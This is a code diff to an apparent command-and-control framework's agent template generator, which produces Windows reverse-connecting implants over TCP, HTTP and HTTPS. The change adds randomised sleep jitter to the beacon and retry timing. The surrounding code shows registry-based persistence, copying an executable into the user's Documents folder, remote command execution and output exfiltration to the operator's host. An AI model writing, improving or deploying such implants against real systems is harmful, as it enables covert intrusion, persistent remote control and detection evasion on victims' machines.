@@ -1,5 +1,5 @@
 # templates/tcp_agent_template.py
-def tcp_agent_template(lhost, lport, persistence,agent_id):
+def tcp_agent_template(lhost, lport, persistence,agent_id,sleepTimer,jitterPercentage):
     if persistence==True:
         val2= """def ensure_persistence():
     destination_executable = os.path.join(os.environ['USERPROFILE'], 'Documents', "TCPAGENT.exe")
@@ -25,6 +25,11 @@ import sys
 import random
 import time
 
+def sleep_with_jitter(base_sleep, jitter_pct):
+    jitter = base_sleep * (jitter_pct / 100.0)  # Calculate jitter as a percentage of the base sleep
+    final_sleep_time = random.uniform(base_sleep - jitter, base_sleep + jitter)  # Calculate final sleep time
+    time.sleep(final_sleep_time)  # Sleep for the calculated time
+
 agent_id='{agent_id}'
 ip = '{lhost}'
 port = {lport}
@@ -42,7 +47,7 @@ def attempt_connection():
             return cs
         except socket.error:
             #print("Connection failed, retrying in a few seconds...")
-            time.sleep(random.randint(5, 10))
+            time.sleep({sleepTimer})
 
 def change_directory(client_socket, directory):
     global current_working_directory
@@ -118,6 +123,8 @@ def process_commands(client_socket):
             if not command:
                 # No command received; skip this iteration
                 continue
+                
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
 
             if command == 'quit':
                 print("Quitting...")
@@ -163,7 +170,7 @@ if __name__ == "__main__":
 
 """
 
-def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id):
+def http_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id,jitterPercentage):
     if persistence==True:
         val1=f'''def ensure_persistence():
     try:
@@ -189,6 +196,11 @@ import sys
 import shutil
 import winreg as wreg
 import random
+
+def sleep_with_jitter(base_sleep, jitter_pct):
+    jitter = base_sleep * (jitter_pct / 100.0)  # Calculate jitter as a percentage of the base sleep
+    final_sleep_time = random.uniform(base_sleep - jitter, base_sleep + jitter)  # Calculate final sleep time
+    time.sleep(final_sleep_time)  # Sleep for the calculated time
 
 headers = {{
     "User-Agent": "{userAgent}",
@@ -299,13 +311,13 @@ def register_agent():
                 break  # Break the loop if registration is successful
             else:
                 print("Failed to register agent. Retrying...")
-                time.sleep({sleepTimer})  # Random sleep between retries
+                sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
-            time.sleep({sleepTimer})
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.RequestException as e:
             print(f"Network error: {{e}}")
-            time.sleep({sleepTimer})
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
 
 def main():
     {val2}
@@ -318,20 +330,20 @@ def main():
                 if command_to_execute:
                     output = execute_command(command_to_execute)
                     send_output(output,command_to_execute)
-            time.sleep({sleepTimer})
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
-            time.sleep({sleepTimer})
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.RequestException as e:
             print(f"Network error: {{e}}")
-            time.sleep({sleepTimer})  # Use sleepTimer from the user
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
 
 if __name__ == "__main__":
     main()
 """
     return template
 
-def https_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id):
+def https_agent_template(lhost, lport, persistence, userAgent, sleepTimer,agent_id,jitterPercentage):
     if persistence==True:
         val1=f'''def ensure_persistence():
     try:
@@ -357,6 +369,11 @@ import sys
 import shutil
 import winreg as wreg
 import random
+
+def sleep_with_jitter(base_sleep, jitter_pct):
+    jitter = base_sleep * (jitter_pct / 100.0)  # Calculate jitter as a percentage of the base sleep
+    final_sleep_time = random.uniform(base_sleep - jitter, base_sleep + jitter)  # Calculate final sleep time
+    time.sleep(final_sleep_time)  # Sleep for the calculated time
 
 headers = {{
     "User-Agent": "{userAgent}",
@@ -474,13 +491,13 @@ def register_agent():
                 break  # Break the loop if registration is successful
             else:
                 print("Failed to register agent. Retrying...")
-                time.sleep({sleepTimer})  # Random sleep between retries
+                sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
-            time.sleep({sleepTimer})
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.RequestException as e:
             print(f"Network error: {{e}}")
-            time.sleep({sleepTimer})
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
 
 def main():
     {val2}    
@@ -493,13 +510,13 @@ def main():
                 if command_to_execute:
                     output = execute_command(command_to_execute)
                     send_output(output,command_to_execute)
-            time.sleep({sleepTimer})  # Random sleep between retries
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.ConnectionError:
             print("Unable to connect to the server. Retrying in a few seconds...")
-            time.sleep({sleepTimer})  # Random sleep between 5 to 10 seconds
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
         except requests.exceptions.RequestException as e:
             print(f"Network error: {{e}}")
-            time.sleep({sleepTimer})  # Use sleepTimer from the user
+            sleep_with_jitter(float({sleepTimer}), float({jitterPercentage})) 
 
 if __name__ == "__main__":
     main()
